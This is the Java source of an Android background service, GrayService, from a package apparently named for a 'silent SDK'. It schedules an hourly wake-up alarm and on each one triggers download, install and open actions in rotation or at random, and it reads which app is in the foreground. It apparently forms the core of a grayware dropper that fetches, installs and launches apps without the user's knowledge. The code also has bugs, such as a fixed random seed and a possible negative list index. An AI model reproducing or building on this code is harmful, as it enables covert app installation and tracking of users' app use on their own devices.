package sdk.grayweb.com.slientsdk;

import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.util.Log;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Random;

import sdk.grayweb.com.slientsdk.action.DownloadAction;
import sdk.grayweb.com.slientsdk.action.IAction;
import sdk.grayweb.com.slientsdk.action.InitAction;
import sdk.grayweb.com.slientsdk.action.InstallAction;
import sdk.grayweb.com.slientsdk.action.OpenAction;
import sdk.grayweb.com.slientsdk.util.DownLoadUtil;

/**
 * Created by engine on 16/5/10.
 */
public class GrayService extends Service {
    private List<IAction>  actionList = new ArrayList<IAction>();
    private static final String REVICER = "com.slient.reciver";
    int doActionTime = 1 ;
    @Override
    public void onCreate() {
        super.onCreate();
        actionList.clear();
        actionList.add(new DownloadAction(this));
        actionList.add(new OpenAction(this));
        actionList.add(new InstallAction(this));
        DownLoadUtil.initDir();
        //初奴化数据
        //初始化闹钟
        new InitAction(this).doAction();
        registerReceiver(cupReciver, new IntentFilter(REVICER));
        alarm();
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        unregisterReceiver(cupReciver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    /**
     * 闹钟回来后执行的操作
      */
    private void doAction(){
        if (doActionTime==1){
            new DownloadAction(this).doAction();
        }else if(doActionTime==2){
            new InstallAction(this).doAction();
        }else if(doActionTime==3){
            new OpenAction(this).doAction();
        }else {
            Random random = new Random(1);
            int target = random.nextInt();
            actionList.get(target%3).doAction();
        }
        doActionTime++ ;
    }

    public void alarm() {
        Intent intent = new Intent();
        intent.setAction(REVICER);
        PendingIntent sender = PendingIntent.getBroadcast(
                this, 0, intent, 0);

        // We want the alarm to go off 10 seconds from now.
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(System.currentTimeMillis());
        calendar.add(Calendar.SECOND, 1);
        // Schedule the alarm!
        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
//        am.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), sender);
        am.setRepeating(AlarmManager.RTC_WAKEUP,
                calendar.getTimeInMillis(), 3600 * 1000, sender);
    }

    public static String getCurrentPk(Context context){
        // 当前正在运行的应用的包名
        ActivityManager am = (ActivityManager) context.getSystemService(ACTIVITY_SERVICE);
        String currentrunningpk = am.getRunningTasks(1).get(0).topActivity.getPackageName();
        return currentrunningpk;
    }

    private BroadcastReceiver cupReciver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            doAction();
        }
    };
}
